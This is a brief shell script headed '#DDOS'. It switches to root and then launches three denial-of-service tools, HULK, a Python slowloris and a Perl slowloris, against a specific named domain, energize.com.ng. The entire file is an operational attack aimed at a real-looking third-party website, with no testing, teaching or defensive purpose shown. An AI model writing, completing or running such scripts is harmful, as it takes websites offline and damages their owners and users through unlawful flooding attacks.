#!/bin/sh
#DDOS
sudo -i
cd
/home/vv01f/hulk
python hulk.py www.energize.com.ng 
cd /home/vv01f/slowloris
python3 slowloris.py energize.com.ng  
cd /home/vv01f/Anonymous
perl slowloris.pl -dns www.energize.com.ng -options

